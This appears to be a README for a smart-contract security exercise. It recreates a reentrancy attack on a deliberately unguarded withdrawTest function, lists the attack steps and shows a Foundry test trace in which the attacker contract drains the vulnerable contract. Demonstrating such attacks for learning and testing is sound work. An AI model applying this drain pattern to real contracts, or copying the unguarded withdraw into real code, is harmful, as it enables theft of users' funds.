# renetry_recreation
The hack demonstrated here exploits a reentrancy vulnerability in the vulnerability contract. It was chosen to be my hack because Re-entry attacks highlight the importance of secure coding practices, including implementing reentrancy guards, avoiding external calls in critical functions, and updating contract states before performing any interactions with external parties, it is a well-known attack vector that has historically resulted in significant financial losses in smart contracts.

The withdrawTest function in the VulnerableContract transfers funds to the caller (msg.sender) using call.  However, it fails at updating its balance before sending, this allows the attacker to repeatedly call back into the contract and withdraw funds in a loop, draining its balance. This vulnerability was explicitly left unguarded in the withdrawTest function for testing purposes to recreate the exploit scenario.

how to create work
  1.deploys attack and vulnerability contract
  
  2.attacker deposits a small amount of Ether
  
  3.then the attack function,which calls withdrawTest to withdraw deposited funds
  
  4. The receive fallback function in the attacker contract is then triggered, allowing it to recursively call withdrawTest again before the vulnerable contract updates its balance.
     
  5.This recursive process continues until the gas limit is reached or the contract’s balance is fully drained

  6.the test simulates the real-world conditions of a reentrancy attack, demonstrating the exploit in action

output:
Traces:
  [134814] ReentrancyTest::testReentrancyAttack()
    ├─ [0] console::log("Starting the attack...") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(Attackers: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   └─ ← [Return]
    ├─ [111544] Attackers::attack{value: 1000000000000000000}()
    │   ├─ [5260] VulnerableContract::deposit{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ [94025] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   ├─ [86457] Attackers::receive{value: 1000000000000000000}()
    │   │   │   ├─ [85689] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   │   │   ├─ [78121] Attackers::receive{value: 1000000000000000000}()
    │   │   │   │   │   ├─ [77353] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   │   │   │   │   ├─ [69785] Attackers::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   ├─ [69017] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   │   │   │   │   │   │   ├─ [61449] Attackers::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   ├─ [60681] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   │   │   │   │   │   │   │   │   ├─ [53113] Attackers::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   ├─ [52345] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [44777] Attackers::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [44009] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [36441] Attackers::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [35673] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [28105] Attackers::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [27337] VulnerableContract::withdrawTest(1000000000000000000 [1e18])      
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19769] Attackers::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19001] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8633] Attackers::receive{value: 1000000000000000000}()       
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7865] VulnerableContract::withdrawTest(1000000000000000000 [1e18])
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [297] Attackers::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] console::log("Attacker's balance after the attack: %s ether", 11000000000000000000 [1.1e19]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Vulnerable contract's balance after the attack: %s ether", 0) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::assertEq(11000000000000000000 [1.1e19], 11000000000000000000 [1.1e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 31.67ms (27.50ms CPU time)

Ran 1 test suite in 44.10ms (31.67ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
